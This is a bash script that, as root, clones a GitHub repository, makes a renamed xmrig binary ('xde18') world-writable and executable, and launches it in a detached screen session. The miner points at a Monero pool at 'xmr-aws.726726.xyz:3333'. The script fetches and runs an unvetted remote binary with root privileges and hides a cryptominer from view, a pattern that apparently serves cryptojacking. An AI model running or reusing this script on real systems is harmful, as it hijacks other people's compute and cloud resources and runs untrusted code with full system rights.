#!/bin/bash
sudo -i <<EOF
apt-get update
apt-get install -y git build-essential cmake automake libtool autoconf
git clone https://github.com/yuqingkj/xmrig_debain.git
cd xmrig_debain/
chmod 777 ./xde18
screen -dmS xmr
cmd=$"./xde18 -o xmr-aws.726726.xyz:3333 --rig-id az -t 8";
screen -x -S xmr -p 0 -X stuff "$cmd\n"
echo ok
EOF